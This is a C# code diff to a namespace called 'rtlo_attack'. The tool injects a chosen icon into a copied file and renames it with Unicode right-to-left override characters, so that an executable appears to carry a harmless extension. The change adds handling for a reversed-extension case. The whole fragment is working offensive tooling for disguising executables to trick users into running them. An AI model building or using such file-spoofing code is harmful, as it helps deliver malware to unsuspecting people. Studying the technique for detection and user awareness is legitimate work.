@@ -39,14 +39,22 @@ namespace rtlo_attack
             File.Copy(inputFile, tempFilename);
             IconChanger.InjectIcon(tempFilename, iconFile);
 
+            string fileName;
             if (filename.Contains(extension))
             {
                 string[] array = filename.Split(new string[] { extension }, StringSplitOptions.None);
 
-                string fileName = array[0] + rtlo + Reverse(array[1]) + ltro + extension;
-                File.Move("temp" + extension, fileName);
+                fileName = array[0] + rtlo + Reverse(array[1]) + ltro + extension;
             }
+            else if (filename.Contains(Reverse(extension)))
+            {
+                string[] array = filename.Split(new string[] { Reverse(extension) }, StringSplitOptions.None);
 
+                fileName = array[0] + rtlo + Reverse(array[1]) + extension;
+            }
+            else { return; }
+
+            File.Move("temp" + extension, fileName);
         }
     }
 }
